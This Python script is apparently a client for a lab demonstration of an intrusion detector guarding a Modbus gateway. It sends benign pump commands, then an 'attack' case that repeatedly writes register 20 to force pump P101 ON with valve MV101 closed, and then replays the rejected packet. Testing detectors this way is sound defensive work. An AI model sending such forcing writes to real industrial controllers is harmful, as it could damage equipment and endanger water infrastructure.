"""Dependency-free Kali client for the Stage-1 Modbus demonstration.

Modbus exception 04 means rejected, not proof of an ML block. Correlate the
transaction ID with the Ubuntu evidence watcher before claiming BLOCKED.
"""
import argparse
import socket
import struct
import time
import json
from pathlib import Path

REPLAY_FILE = Path(__file__).resolve().with_name('stage1-demo-last-rejection.json')


def exact(connection, count):
    data = b''
    while len(data) < count:
        part = connection.recv(count - len(data))
        if not part:
            raise EOFError('Gateway closed the connection before a complete reply')
        data += part
    return data


def request(host, port, transaction, function, register, value):
    frame = struct.pack('>HHHBBHH', transaction, 0, 6, 1, function, register, value)
    with socket.create_connection((host, port), timeout=5) as connection:
        connection.settimeout(5)
        connection.sendall(frame)
        header = exact(connection, 7)
        length = struct.unpack('>H', header[4:6])[0]
        if header[:4] != frame[:4] or header[6] != 1 or not 2 <= length <= 254:
            raise ValueError('Invalid Modbus response header')
        pdu = exact(connection, length - 1)
    if pdu[0] == function | 0x80:
        if len(pdu) != 2:
            raise ValueError('Malformed Modbus exception')
        if function == 3:
            raise RuntimeError(f'Read rejected with Modbus exception {pdu[1]:02x}')
        return pdu[1]
    if function == 6 and header + pdu != frame:
        raise ValueError('Write acknowledgment did not match request')
    if function == 3:
        if len(pdu) != 4 or pdu[:2] != b'\x03\x02':
            raise ValueError('Invalid one-register read response')
        return struct.unpack('>H', pdu[2:])[0]
    return None


def write(args, transaction, register, value):
    result = request(args.host, args.port, transaction, 6, register, value)
    if result is None:
        return True
    if result == 4:
        print(f'WRITE REJECTED | tx={transaction} | register={register} value={value} | Modbus exception 04')
        print('Confirm BLOCKED on Ubuntu: same tx, decision=BLOCK, forwarded=NO.')
        return False
    raise RuntimeError(f'Unexpected Modbus exception {result:02x}; this is not a detection result')


def normal(args):
    print('\nBENIGN: turn OFF Stage-1 transfer pump P101 (register 20 = 0).')
    if not write(args, 1000, 20, 0):
        raise RuntimeError('Normal command was rejected. Preserve this failure; restart from a fresh lab state.')
    print('ALLOWED | tx=1000 | write acknowledged; confirm forwarded=YES on Ubuntu.')


def attack(args):
    print('\nSTRESS / ATTACK SCENARIO: repeatedly force P101 ON with MV101 closed.')
    print('The mock advances one simulated second per write. This is sustained draining, not a single-packet exploit.')
    for step in range(1, args.max_requests + 1):
        transaction = 2000 + step
        if not write(args, transaction, 20, 1):
            REPLAY_FILE.write_text(json.dumps({'host': args.host, 'port': args.port,
                                              'transaction': transaction, 'register': 20, 'value': 1}))
            print(f'Stopped at request {step}; no further forcing commands sent.')
            return True
        if step == 1 or step % 50 == 0:
            print(f'Progress: {step} requests allowed before any rejection.')
        if args.interval:
            time.sleep(args.interval)
    print(f'NO REJECTION after {args.max_requests} requests. Record this result; do not claim successful detection.')
    return False


def repeat(args):
    if not REPLAY_FILE.exists():
        raise RuntimeError('Run the attack case first so the rejected packet can be replayed exactly')
    saved = json.loads(REPLAY_FILE.read_text())
    if (saved['host'], saved['port']) != (args.host, args.port):
        raise RuntimeError('The saved rejected packet belongs to another destination; run attack first')
    allowed = write(args, saved['transaction'], saved['register'], saved['value'])
    print('REPEAT ALLOWED' if allowed else 'SAME PACKET REJECTED; confirm quarantined-command decision on Ubuntu.')
    return allowed


def state(args):
    for transaction, register, name, scale in [
        (5000, 100, 'LIT101 [mm]', 10),
        (5001, 110, 'FIT101 [m3/h]', 1000),
        (5002, 20, 'P101', 1), (5003, 24, 'P102', 1), (5004, 30, 'MV101', 1),
    ]:
        value = request(args.host, args.port, transaction, 3, register, 1)
        print(f'{name}: {value / scale:g}')


def checkpoint(number, message):
    print(f'\nTAKE SCREENSHOT {number} NOW: {message}')
    input('Press Enter AFTER saving the screenshot to continue... ')


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument('--host', required=True, help='Ubuntu gateway IP as reachable from Kali')
    parser.add_argument('--port', type=int, default=5020)
    parser.add_argument('--case', choices=('normal', 'attack', 'state', 'recovery', 'repeat', 'walkthrough'), required=True)
    parser.add_argument('--max-requests', type=int, default=400)
    parser.add_argument('--interval', type=float, default=.02)
    args = parser.parse_args()
    if not 1 <= args.max_requests <= 1000 or not 0 <= args.interval <= 5:
        parser.error('Use 1..1000 requests and an interval from 0..5 seconds')
    print(f'STAGE 1 DEMO | destination={args.host}:{args.port} | LIT101 / FIT101 / MV101 / P101 / P102')
    try:
        if args.case == 'state':
            state(args)
        elif args.case == 'normal':
            normal(args)
        elif args.case == 'attack':
            if not attack(args):
                raise SystemExit(2)
        elif args.case == 'repeat':
            if repeat(args):
                raise SystemExit(2)
        elif args.case == 'recovery':
            normal(args)
            print('SAME BENIGN PACKET ALLOWED AGAIN | tx=1000')
        else:
            checkpoint(1, 'Ubuntu startup and evidence watcher showing Stage-1-only mode; keep this Kali window visible.')
            normal(args)
            checkpoint(2, 'Kali benign P101 OFF ALLOWED tx=1000 plus Ubuntu ALLOW / forwarded=YES.')
            if not attack(args):
                raise SystemExit(2)
            checkpoint(3, 'Kali rejection plus the matching Ubuntu BLOCK / forwarded=NO. Confirm this was not a server error.')
            allowed = repeat(args)
            if allowed:
                raise RuntimeError('Repeat was allowed; preserve the result instead of claiming quarantine worked')
            checkpoint(4, 'Identical rejected packet replay blocked; Ubuntu quarantine reason, generated Snort rule, and mock pumps OFF.')
            normal(args)
            print('SAME BENIGN PACKET ALLOWED AGAIN | tx=1000')
            checkpoint(5, 'Normal pump-OFF command allowed after blocking the forced-ON command.')
    except (OSError, EOFError, ValueError, RuntimeError) as error:
        print(f'DEMO ERROR: {error}')
        raise SystemExit(1)


if __name__ == '__main__':
    main()
